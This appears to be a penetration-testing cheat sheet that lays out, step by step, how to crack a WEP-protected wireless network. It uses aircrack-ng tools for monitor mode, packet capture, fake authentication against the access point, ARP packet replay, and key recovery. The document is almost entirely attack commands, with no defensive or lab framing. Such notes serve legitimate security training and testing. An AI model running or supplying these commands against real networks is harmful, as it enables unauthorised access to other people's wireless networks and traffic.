Cracking WEP via a Client Attack
-----------------------------------------

Place your wireless card into monitor mode on the AP channel:

airmon-ng start <interface> <AP channel>

Start a capture dump, filtering on the AP channel and BSSID, saving the capture to a file:

airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>

Next, conduct a fake authentication against the access point:

aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>

Launch the interactive packet replay attack looking for ARP packets coming from the AP:

aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>

aircrack-ng -z <capture>
